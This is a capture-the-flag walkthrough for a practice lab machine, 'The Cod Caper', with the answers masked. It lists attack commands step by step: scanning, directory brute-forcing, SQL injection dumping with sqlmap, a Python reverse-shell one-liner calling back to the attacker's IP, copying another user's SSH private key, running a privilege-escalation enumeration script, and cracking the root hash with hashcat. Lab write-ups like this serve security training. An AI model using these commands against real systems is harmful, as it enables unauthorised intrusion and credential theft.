# The Cod Caper

- Help me out! :)

	  no answer needed

- How many ports are open on the target machine?

	- `scilla port -target <TARGET_IP>`
	- `*`

- What is the http-title of the web server?

	- `nmap -A -p 80 <TARGET_IP>`
	- `Apache2 ******************`

- What version is the ssh service?

	- `nmap -A -p 22 <TARGET_IP>`
	- `*************************`

- What is the version of the web server?

	- `Apache/*.*.**`

- What is the name of the important file on the server?

	- `gobuster dir -u <TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/big.txt -x "php,txt"`
	- `a***********.***`

- What is the admin username?

	- `sqlmap -u http://<TARGET_IP>/**************.php --forms --dump`
	- `********`

- What is the admin password?

	- `**********`

- How many forms of SQLI is the form vulnerable to?

	- `*`

- How many files are in the current directory?

	- `ls`
	- `*`

- Do I still have an account

	- `***`

- What is my ssh password?

	- `nc -lvnp 1234`
	- `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
	- `cd /home`
	- `cd pingu/.ssh`
	- `cat id_rsa`
	- Copy the private key
	- `chmod 600 id_rsa`
	- `ssh pingu@<TARGET_IP> -i id_rsa`
	- We need a pwd anyway.
	- `find / -name *pass* 2>/dev/null`
	- `cd ***/******/***`
	- SSH with password.
	- `***********`

- What is the interesting path of the interesting suid file

	- `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
	- `sudo python -m http.server`
	- `wget http://<YOUR_IP>:8000/LinEnum.sh`
	- `chmod +x LinEnum.sh`
	- `./LinENum.sh`
	- `/***/******/****`

- Read the above :)

	  no answer needed

- Woohoo!

	  no answer needed

- Even more woohoo!

	  no answer needed

- What is the root password!

	- Copy the root hash inside a file called `hash`
	- `hashcat -m 1800 hash --wordlist /usr/share/wordlists/rockyou.txt --force`
	- `****2****`

- You helped me out!

	  no answer needed

